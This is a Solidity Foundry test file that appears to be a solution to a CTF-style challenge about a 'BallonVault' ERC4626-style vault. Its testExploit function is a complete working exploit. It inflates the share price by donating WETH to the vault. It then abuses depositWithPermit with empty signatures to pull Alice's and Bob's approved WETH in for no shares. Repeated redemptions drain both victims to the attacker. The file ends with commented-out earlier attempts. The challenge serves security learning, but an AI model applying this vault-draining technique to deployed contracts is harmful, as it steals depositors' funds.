// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {WETH} from "../src/5_balloon-vault/WETH.sol";
import {BallonVault} from "../src/5_balloon-vault/Vault.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge5Test is Test {
    BallonVault public vault;
    WETH public weth = new WETH();

    address public attacker = makeAddr("attacker");
    address public bob = makeAddr("bob");
    address public alice = makeAddr("alice");

    function setUp() public {
        vault = new BallonVault(address(weth));

        // Attacker starts with 10 ether
        vm.deal(address(attacker), 10 ether);

        // Set up Bob and Alice with 500 WETH each
        weth.deposit{value: 1000 ether}();
        weth.transfer(bob, 500 ether);
        weth.transfer(alice, 500 ether);

        vm.prank(bob);
        weth.approve(address(vault), 500 ether);
        vm.prank(alice);
        weth.approve(address(vault), 500 ether);
    }

    fallback() external payable{
        console.log("fallback called");
    } 
    function testExploit() public {
        vm.startPrank(attacker);
        uint attackerBalance=10 ether;
        weth.deposit{value:10 ether}();
        uint alice_balance=500 ether;
        for (uint i = 0; alice_balance>0; i++) {
        console.log("\n iteration number ",i,"\n");
        weth.approve(address(vault),1 wei);
        vault.deposit(1 wei, attacker);
        weth.transfer(address(vault) , attackerBalance-1 );    
        console.log("vault:attacker:deposit:1 : assets ",vault.totalAssets()," totalSupply ",vault.totalSupply());
        uint alice_deposit_amount=alice_balance>=attackerBalance - 1 ? attackerBalance - 1 : alice_balance;
        vault.depositWithPermit(alice,alice_deposit_amount ,block.timestamp+10000,1,"","");
        console.log("vault:alice:deposit:1 : assets ",vault.totalAssets()," totalSupply ",vault.totalSupply());        
        console.log("vault State after bob's deposit : assets ",vault.totalAssets()," totalSupply ",vault.totalSupply());
        vault.redeem(1, attacker, attacker);
        console.log("vault:attacker:Redeem:1 : assets ",vault.totalAssets()," totalSupply ",vault.totalSupply());
        alice_balance=weth.balanceOf(alice);        
        attackerBalance=weth.balanceOf(attacker);
        console.log("\nbalance of attacker",attackerBalance/10**18," ETH \n");
    
        }
        uint bob_balance=500 ether;

        for (uint i = 0; bob_balance>0; i++) {
        console.log("\n iteration number ",i,"\n");
        weth.approve(address(vault),1 wei);
        vault.deposit(1 wei, attacker);
        weth.transfer(address(vault) , attackerBalance-1 );    
        console.log("vault:attacker:deposit:1 : assets ",vault.totalAssets()," totalSupply ",vault.totalSupply());
        uint bob_deposit_amount=bob_balance>=attackerBalance - 1 ? attackerBalance - 1 : bob_balance;
        vault.depositWithPermit(bob,bob_deposit_amount ,block.timestamp+10000,1,"","");
        console.log("vault:bob:deposit:1 : assets ",vault.totalAssets()," totalSupply ",vault.totalSupply());        
        console.log("vault State after bob's deposit : assets ",vault.totalAssets()," totalSupply ",vault.totalSupply());
        vault.redeem(1, attacker, attacker);
        console.log("vault:attacker:Redeem:1 : assets ",vault.totalAssets()," totalSupply ",vault.totalSupply());
        bob_balance=weth.balanceOf(bob);        
        attackerBalance=weth.balanceOf(attacker);
        console.log("\nbalance of attacker",attackerBalance/10**18," ETH \n");
    
        }


        // weth.approve(address(vault),14 ether);
        // vault.deposit(14 ether, attacker);
        // console.log("vault:attacker:deposit:2 : assets ",vault.totalAssets()," totalSupply ",vault.totalSupply());

        // vault.depositWithPermit(alice,10 ether,block.timestamp+10000,1,"","");
        // console.log("vault:alice:deposit:1 : assets ",vault.totalAssets()," totalSupply ",vault.totalSupply());

        // vault.redeem(vault.balanceOf(attacker), attacker, attacker);
        // console.log("vault:attacker:redeem:2 : assets ",vault.totalAssets()," totalSupply ",vault.totalSupply());
        // console.log("\nbalance of attacker",weth.balanceOf(attacker)," ");

        // vault.balanceOf(attacker);
        // vault.withdraw(1, attacker, attacker);
        // vault.transfer(attacker,vault.balanceOf(attacker) );
        // console.log("balance of attacker",weth.balanceOf(attacker)," ");
        // vault.totalAssets();



        // vault.depositWithPermit(bob,500 ether,block.timestamp+10000,2,"","");

        // weth.balanceOf(alice);
        // weth.balanceOf(bob);
        // weth.balanceOf(address(vault));
        // weth.balanceOf(attacker);
        // vault.redeem(shares, receiver, owner);
        // vault.withdraw(vault.maxWithdraw(alice), attacker, alice);
        // vault.withdraw(vault.maxWithdraw(alice), attacker, bob);
        
        
        // pack v, r, s into 65bytes signature
        // bytes memory signature = abi.encodePacked(r, s, v);
        // bytes memory data = abi.encodePacked(r, s, v);


        //==================================================//
        // vm.stopPrank();

        // assertGt(
        //     weth.balanceOf(address(attacker)),
        //     1000 ether,
        //     "Attacker should have more than 1000 ether"
        // );

    }


}
